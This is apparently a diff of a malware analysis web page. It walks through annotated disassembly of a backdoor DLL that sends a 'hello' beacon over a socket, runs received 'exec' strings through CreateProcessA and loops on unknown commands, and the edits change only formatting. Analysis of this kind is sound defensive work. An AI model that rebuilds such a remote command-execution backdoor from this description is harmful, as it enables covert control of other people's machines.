+<p>If the connection is successful, the string “<em>hello</em>” is sent with the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send"><em>send</em></a>:</p>
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x100010FA</span>    <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; len</span>
 <span class="err">0</span><span class="nf">x100010FB</span>    <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">buf</span>      <span class="c1">; "hello"</span>
 <span class="err">0</span><span class="nf">x10001100</span>    <span class="nv">push</span>    <span class="nb">esi</span>             <span class="c1">; s</span>
@@ -752,7 +756,7 @@ Then, a pointer to the name of the DLL is retrieved from the value of the field 
 <span class="err">100011</span><span class="nf">BE</span>    <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">cmd_quit</span>
 </code></pre></div>    </div>
   </li>
-  <li><strong>exec</strong>: use the string following the command <em>exec</em> as <em>lpCommandLine</em> parameter for the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa"><em>CreateProcessA</em></a>:
+  <li><strong>exec</strong>: use the string following the command <em>exec</em> as <em>lpCommandLine</em> parameter for the API <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa">CreateProcessA</a>:
     <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x10001161</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">1208h</span><span class="o">+</span><span class="nv">data_received</span><span class="p">]</span>
 <span class="err">0</span><span class="nf">x10001168</span>    <span class="nv">push</span>    <span class="mi">4</span>               <span class="c1">; MaxCount</span>
 <span class="err">0</span><span class="nf">x1000116A</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; Str2</span>
@@ -777,7 +781,7 @@ Then, a pointer to the name of the DLL is retrieved from the value of the field 
 <span class="err">0</span><span class="nf">x100011AF</span>    <span class="nv">call</span>    <span class="nb">ebx</span> <span class="c1">; CreateProcessA</span>
 <span class="err">0</span><span class="nf">x100011B1</span>    <span class="nv">jmp</span>     <span class="nv">retry</span>
 </code></pre></div>    </div>
-    <p>If an unrecognised commmand is received, the DLL sleeps for 0x60000 milliseconds and loops up to the sending of the <em>hello</em> string.</p>
+    <p>If an unrecognised commmand is received, the DLL sleeps for 0x60000 milliseconds and loops up to the sending of the “<em>hello</em>” string.</p>
   </li>
 </ol>
 
